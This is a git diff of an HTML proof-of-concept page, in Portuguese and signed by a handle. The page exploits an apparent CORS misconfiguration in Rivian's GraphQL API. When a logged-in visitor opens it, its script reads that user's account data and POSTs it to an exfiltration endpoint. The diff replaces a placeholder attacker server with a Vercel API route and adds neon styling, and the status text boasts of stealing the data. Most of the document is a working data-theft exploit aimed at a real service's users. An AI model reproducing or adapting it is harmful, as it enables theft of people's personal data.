@@ -2,16 +2,157 @@
 <html>
 
 <head>
-  <title>Rivian CORS Data Exfiltration</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>POC - Owned by Cr0wtl3r - Rivian CORS Exfil</title>
+  <style>
+    /* Reset básico */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Hack', 'Fira Code', 'Roboto Mono', monospace;
+      background-color: #0d0d0d;
+      color: #00ff00;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    .neon-text {
+      color: #00ff00;
+      text-shadow: 0 0 5px #00ff00,
+        0 0 10px #00ff00,
+        0 0 20px #00ff00,
+        0 0 40px #00cc00,
+        0 0 80px #009900;
+    }
+
+    .neon-glow {
+      box-shadow: 0 0 5px #00ff00,
+        0 0 10px #00ff00,
+        0 0 20px #00ff00;
+    }
+
+    .neon-box {
+      border: 1px solid #00ff00;
+      box-shadow: 0 0 5px #00ff00,
+        0 0 10px #00ff00;
+      padding: 20px;
+      margin: 20px;
+      max-width: 90%;
+      width: 800px;
+      box-sizing: border-box;
+      background-color: rgba(0, 50, 0, 0.2);
+    }
+
+    h1 {
+      font-size: 2.5em;
+      text-align: center;
+      margin-bottom: 30px;
+      text-transform: uppercase;
+    }
+
+    h2 {
+      font-size: 1.5em;
+      text-align: center;
+      margin-top: 40px;
+      margin-bottom: 20px;
+      color: #ff00ff;
+      text-shadow: 0 0 5px #ff00ff,
+        0 0 10px #ff00ff,
+        0 0 15px #ff00ff;
+    }
+
+    p#status {
+      font-size: 1.1em;
+      text-align: center;
+      padding: 10px;
+      border-radius: 3px;
+      margin-top: 20px;
+      transition: all 0.3s ease;
+    }
+
+    p#status.success {
+      background-color: rgba(0, 255, 0, 0.2);
+      color: #00ff00;
+      border: 1px solid #00ff00;
+      box-shadow: 0 0 5px #00ff00;
+    }
+
+    p#status.error {
+      background-color: rgba(255, 0, 0, 0.2);
+      color: #ff0000;
+      border: 1px solid #ff0000;
+      box-shadow: 0 0 5px #ff0000;
+    }
+
+    pre#data {
+      background-color: #1a1a1a;
+      color: #00ff00;
+      padding: 15px;
+      border-radius: 5px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      border: 1px solid #00ff00;
+      box-shadow: 0 0 5px #00ff00;
+      min-height: 150px;
+    }
+
+    .signature {
+      font-size: 1.2em;
+      margin-top: 50px;
+      color: #00ffff;
+      text-shadow: 0 0 5px #00ffff,
+        0 0 10px #00ffff;
+      text-align: center;
+    }
+
+    .loading::after {
+      content: ' .';
+      animation: dots 1s steps(5, end) infinite;
+    }
+
+    @keyframes dots {
+
+      0%,
+      20% {
+        color: rgba(0, 0, 0, 0);
+        text-shadow: none;
+      }
+
+      25% {
+        color: #00ff00;
+        text-shadow: 0 0 5px #00ff00;
+      }
+
+      100% {
+        color: #00ff00;
+        text-shadow: 0 0 5px #00ff00;
+      }
+    }
+  </style>
 </head>
 
 <body>
-  <h1>Aguarde... Roubando seus dados da Rivian.</h1>
-  <pre id="data"></pre>
+  <div class="neon-box">
+    <h1 class="neon-text">INICIANDO OPERAÇÃO DE EXFILTRAÇÃO</h1>
+    <h2 class="neon-text">Alvo: Rivian GraphQL API</h2>
+
+    <p id="status" class="status loading">Tentando exfiltrar dados sensíveis...</p>
+    <pre id="data"></pre>
+
+    <div class="signature neon-text">
+      POC - Owned by Cr0wtl3r
+    </div>
+  </div>
 
   <script>
     const graphqlUrl = 'https://rivian.com/api/gql/gateway/graphql';
-    const exfilServerUrl = 'http://servidor_em_questão:14455/log_data';
+    const exfilServerUrl = '/api/log_data';
 
     const query = `
         {
@@ -47,14 +188,19 @@
     const dataDisplay = document.getElementById('data');
     const statusDisplay = document.getElementById('status');
 
+    function updateStatus(message, type) {
+      statusDisplay.textContent = message;
+      statusDisplay.className = 'status ' + type;
+    }
+
     fetch(graphqlUrl, options)
       .then(response => {
         const acaoHeader = response.headers.get('Access-Control-Allow-Origin');
         console.log('Access-Control-Allow-Origin recebido:', acaoHeader);
 
         if (!response.ok) {
-          statusDisplay.className = 'error';
-          throw new Error(`HTTP error! Status: ${response.status} - ${response.statusText}`);
+          updateStatus(`HTTP error! Status: ${response.status} - ${response.statusText}. CORS pode ter bloqueado a leitura, mas a requisição foi feita.`, 'error');
+          throw new Error(`HTTP error! Status: ${response.status} - ${response.statusText}. CORS pode ter bloqueado a leitura.`);
         }
         return response.json();
       })
@@ -62,9 +208,8 @@
         if (data && data.data && data.data.currentUser) {
           const exfiltratedData = data.data.currentUser;
           dataDisplay.textContent = JSON.stringify(exfiltratedData, null, 2);
-          statusDisplay.className = 'success';
-          statusDisplay.textContent = 'Dados do usuário Rivian roubados com sucesso! Enviando para o servidor do atacante...';
-          console.log('Dados roubados (visíveis no navegador):', exfiltratedData);
+          updateStatus('Dados do usuário Rivian capturados! Enviando para a sua API Vercel...', 'success');
+          console.log('Dados capturados (visíveis no navegador):', exfiltratedData);
 
           fetch(exfilServerUrl, {
             method: 'POST',
@@ -75,35 +220,32 @@
           })
             .then(res => {
               if (res.ok) {
-                console.log('Dados enviados com sucesso para o servidor local!');
-                statusDisplay.textContent += ' Dados enviados para o servidor local!';
+                console.log('Dados exfiltrados com sucesso para a sua API Vercel!');
+                statusDisplay.textContent += ' (Exfiltração para Vercel concluída!)';
               } else {
-                console.error('Falha ao enviar dados para o servidor local:', res.statusText);
-                statusDisplay.textContent += ' Erro ao enviar dados para o servidor local.';
+                console.error('Falha ao exfiltrar dados para a sua API Vercel:', res.statusText);
+                statusDisplay.textContent += ' (Erro ao enviar dados para a Vercel.)';
               }
             })
             .catch(err => {
-              console.error('Erro de rede ao tentar exfiltrar dados para o servidor local:', err);
-              statusDisplay.textContent += ' Erro de rede ao tentar enviar dados para o servidor local.';
+              console.error('Erro de rede ao tentar exfiltrar dados para a sua API Vercel:', err);
+              statusDisplay.textContent += ' (Erro de rede na exfiltração para Vercel.)';
             });
 
         } else if (data && data.errors) {
           dataDisplay.textContent = JSON.stringify(data.errors, null, 2);
-          statusDisplay.className = 'error';
-          statusDisplay.textContent = 'Requisição GraphQL retornou erros (mas ainda é um CORS bypass):';
+          updateStatus('Requisição GraphQL retornou erros na API Rivian. Verifique se PII foi exposto no console.', 'error');
           console.error('Erros GraphQL:', data.errors);
         } else {
-          dataDisplay.textContent = 'Nenhum dado do usuário encontrado ou formato inesperado.';
-          statusDisplay.className = 'error';
-          statusDisplay.textContent = 'Resposta inesperada do servidor.';
-          console.log('Resposta completa inesperada:', data);
+          dataDisplay.textContent = 'Nenhum dado do usuário encontrado ou formato inesperado na resposta da Rivian.';
+          updateStatus('Resposta inesperada da API Rivian.', 'error');
+          console.log('Resposta completa inesperada da Rivian:', data);
         }
       })
       .catch(error => {
-        console.error('Erro ao tentar roubar dados:', error);
-        dataDisplay.textContent = 'Erro ao tentar roubar os dados: ' + error.message;
-        statusDisplay.className = 'error';
-        statusDisplay.textContent = 'Erro durante a exfiltração de dados!';
+        console.error('Erro durante a operação de exfiltração:', error);
+        dataDisplay.textContent = 'Erro grave durante a operação: ' + error.message;
+        updateStatus('FALHA NA EXFILTRAÇÃO! Verifique o console para detalhes técnicos.', 'error');
       });
   </script>
 </body>
